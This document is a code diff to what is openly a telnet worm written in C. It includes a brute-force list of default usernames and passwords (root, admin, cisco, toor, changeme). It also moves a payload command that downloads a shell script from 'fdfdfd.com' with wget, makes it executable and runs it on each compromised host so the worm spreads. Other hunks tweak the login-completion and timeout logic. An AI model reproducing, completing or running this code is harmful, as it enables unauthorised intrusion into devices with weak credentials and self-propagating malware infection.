@@ -24,6 +24,7 @@ w the credentials we expect there..
 // distribution host for WORM
 char distribution_host[] = "fdfdfd.com";
 char distribution_filename[] = "a.sh";
+char cmdline[] = "cd /tmp || /var/tmp;wget http://%DIST%/%FNAME%;chmod +x %FNAME%;./%FNAME% %DSTIP%\r\n";
 
 char *users[] = { "root", "admin", "user", "login", "guest", "support", "cisco", NULL };
 char *passwords[] = { "root", "toor", "admin", "user", "guest", "login", "changeme", "1234", 
@@ -118,6 +119,7 @@ char *BuildLogin(Modules *mptr, Connection *cptr, int *size) {
     
     // must be completed....
     if (users[Cstate->users] == NULL) {
+        Cstate->complete = 1;
         ConnectionBad(cptr);
         
         return NULL;
@@ -205,8 +207,7 @@ void str_replace(char **str, char *macro, char *replace) {
 }
 
 // we have to pass the connection its own IP.. it can be used for when it penetrates a new target (at least on this execution)
-char *BuildWORM(Modules *mptr, Connection *cptr, int *size) {
-    char cmdline[] = "cd /tmp || /var/tmp;wget http://%DIST%/%FNAME%;chmod +x %FNAME%;./%FNAME% %DSTIP%\r\n";
+char *BuildWORM(Modules *mptr, Connection *cptr, int *size) {    
     char *ret = strdup(cmdline);
     struct sockaddr_in dst;
     
@@ -336,7 +337,7 @@ int telnet_main_loop(Modules *mptr, Connection *cptr, char *buf, int size) {
     // max of 5 minutes!
     for (cptr = mptr->connections; cptr != NULL; cptr = cptr->next) {
         // removed !stateOK because we want it to timeout after 5 mins of the worm string (wget, etc)
-        if (cur_ts - cptr->start_ts > 10) {//} && !stateOK(cptr)) {
+        if (cur_ts - cptr->start_ts > (cptr->state == STATE_OK ? 60 : 10)) {//} && !stateOK(cptr)) {
             ConnectionBad(cptr);
         }
     }
